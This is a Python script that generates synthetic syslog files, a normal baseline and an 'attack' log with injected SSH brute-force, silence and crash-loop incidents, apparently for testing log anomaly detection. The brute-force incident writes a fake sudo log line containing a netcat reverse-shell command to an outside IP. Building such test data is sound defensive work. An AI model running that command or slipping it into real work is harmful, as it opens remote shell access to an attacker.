"""Synthetic syslog generator: normal.log (training) and attack.log (with injected incidents)."""
import math
import os
import random
from datetime import datetime, timedelta

USERS = ["alice", "bob", "deploy"]
INTERNAL = ["10.0.0.5", "10.0.0.12", "192.168.1.20"]
NOISE_IPS = ["45.33.32.156", "103.41.12.9", "198.51.100.77", "203.0.113.50", "91.240.118.3"]
HOST = "web01"


def _fmt(ts, proc, msg, pid=None):
    p = f"{proc}[{pid}]" if pid else proc
    return f"{ts.strftime('%b')} {ts.day:2d} {ts:%H:%M:%S} {HOST} {p}: {msg}"


def _normal(rng, ts):
    r = rng.random()
    u, ip, pid = rng.choice(USERS), rng.choice(INTERNAL), rng.randint(1000, 30000)
    if r < 0.18:
        return [_fmt(ts, "sshd", f"Accepted publickey for {u} from {ip} port {rng.randint(40000, 60000)} ssh2: RSA SHA256:{rng.getrandbits(64):x}Ab", pid),
                _fmt(ts, "systemd-logind", f"New session {rng.randint(1, 900)} of user {u}.", 700)]
    if r < 0.30:
        return [_fmt(ts, "sshd", f"Received disconnect from {ip} port {rng.randint(40000, 60000)}:11: disconnected by user", pid)]
    if r < 0.55:
        return [_fmt(ts, "CRON", "pam_unix(cron:session): session opened for user root by (uid=0)", pid),
                _fmt(ts, "CRON", "pam_unix(cron:session): session closed for user root", pid)]
    if r < 0.70:
        return [_fmt(ts, "sudo", f"{u} : TTY=pts/0 ; PWD=/home/{u} ; USER=root ; COMMAND=/usr/bin/apt update")]
    if r < 0.82:
        return [_fmt(ts, "systemd", "Started Daily apt download activities.", 1)]
    if r < 0.88:
        return [_fmt(ts, "kernel", f"[{rng.uniform(1000, 99999):.6f}] eth0: link up, 1000Mbps")]
    return [_fmt(ts, "sshd", f"Failed password for invalid user {rng.choice(['admin', 'test', 'oracle'])} from {rng.choice(NOISE_IPS)} port {rng.randint(1024, 65000)} ssh2", pid)]


def _generate(start, hours, seed, incidents):
    rng, lines = random.Random(seed), []
    for minute in range(hours * 60):
        ts = start + timedelta(minutes=minute)
        hour = ts.hour + ts.minute / 60
        load = 0.25 + 1.0 * max(0.0, math.sin((hour - 6) / 24 * 2 * math.pi))     # busy in daytime
        if any(a <= minute < b for a, b, _ in incidents if _ == "silence"):
            continue
        for _ in range(sum(rng.random() < load / 2 for _ in range(4))):
            lines += _normal(rng, ts + timedelta(seconds=rng.randint(0, 59)))
        for a, b, kind in incidents:
            if not a <= minute < b:
                continue
            def sec(ts=ts):
                return ts + timedelta(seconds=rng.randint(0, 59))
            if kind == "bruteforce":
                for _ in range(45):
                    lines.append(_fmt(sec(), "sshd", f"Failed password for {rng.choice(['root', 'admin', 'ubuntu', 'git'])} from 185.220.101.4 port {rng.randint(1024, 65000)} ssh2", rng.randint(1000, 30000)))
                if minute == b - 1:
                    lines.append(_fmt(sec(), "sshd", "Accepted password for root from 185.220.101.4 port 51022 ssh2", 4242))
                    lines.append(_fmt(sec(), "sudo", "root : TTY=pts/1 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/nc -e /bin/sh 185.220.101.4 4444"))
            elif kind == "crashloop":
                for _ in range(3):
                    lines.append(_fmt(sec(), "systemd", "nginx.service: Main process exited, code=exited, status=1/FAILURE", 1))
                    lines.append(_fmt(sec(), "kernel", f"[{rng.uniform(1000, 99999):.6f}] Out of memory: Killed process {rng.randint(100, 9000)} (nginx)"))
    return lines


def write_demo(out_dir: str, now: datetime = None):
    now = (now or datetime.now()).replace(second=0, microsecond=0)
    os.makedirs(out_dir, exist_ok=True)
    normal_start = now - timedelta(days=5)
    attack_start = now - timedelta(days=1)
    start_min = attack_start.hour * 60 + attack_start.minute
    def at(hh):                                            # minute offset of a wall-clock hour
        return (hh * 60 - start_min) % 1440
    incidents = [(at(14), at(14) + 15, "bruteforce"), (at(10), at(10) + 40, "silence"),
                 (at(3), at(3) + 20, "crashloop")]
    with open(os.path.join(out_dir, "normal.log"), "w") as fh:
        fh.write("\n".join(_generate(normal_start, 96, 1, [])) + "\n")
    with open(os.path.join(out_dir, "attack.log"), "w") as fh:
        fh.write("\n".join(_generate(attack_start, 24, 2, incidents)) + "\n")
    return os.path.join(out_dir, "normal.log"), os.path.join(out_dir, "attack.log")
